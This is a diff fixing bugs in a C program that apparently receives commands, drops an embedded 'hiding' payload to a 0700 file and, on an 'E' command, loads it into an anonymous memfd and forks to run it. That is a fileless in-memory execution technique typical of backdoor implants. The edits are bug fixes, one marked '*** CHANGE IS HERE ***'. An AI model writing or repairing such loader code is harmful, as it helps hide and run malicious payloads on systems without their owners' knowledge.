@@ -8,13 +8,16 @@
 #include <unistd.h>
 #include <wait.h>
 #include <fcntl.h>
-#include <sys/memfd.h> 
-#include <sys/syscall.h>
-#include <unistd.h>
+#include <sys/mman.h> 
+#include <sys/stat.h>
 #include "hiding.h"
 
 
-unsigned int payload_len = sizeof(payload.h);
+extern unsigned char hiding_c[];
+extern unsigned int hiding_c_len;
+
+unsigned char *payload = hiding_c;
+unsigned int payload_len = hiding_c_len;
 
 void sigchld_handler(int s)
 {
@@ -89,7 +92,7 @@ int main(void){
 
 				int payload_fd = open("payload.c", O_WRONLY | O_CREAT | O_TRUNC, 0700);
 				write(payload_fd, payload, payload_len);
-				close(fd);
+				close(payload_fd);
 			}else if(strcmp(buffer, "E") == 0)
 			{
 				printf("I got an E (Execute command). Loading payload into memory...\n");
@@ -99,12 +102,13 @@ int main(void){
 					perror("[-]memfd_create failed");
 				}
 
+				// *** CHANGE IS HERE ***
 				ssize_t bytes_written = write(fd, payload, payload_len);
 				if (bytes_written != payload_len) {
 					perror("[-]write to memfd failed (Incomplete write)");
 					close(fd);
 				} else {
-					printf("[+]Payload loaded into memory (%d bytes).\n", (int)bytes_written);
+					printf("[+]Payload loaded into memory (%u bytes).\n", payload_len); // Changed type specifier
 				}
 				
 				pid_t p1fork = fork();
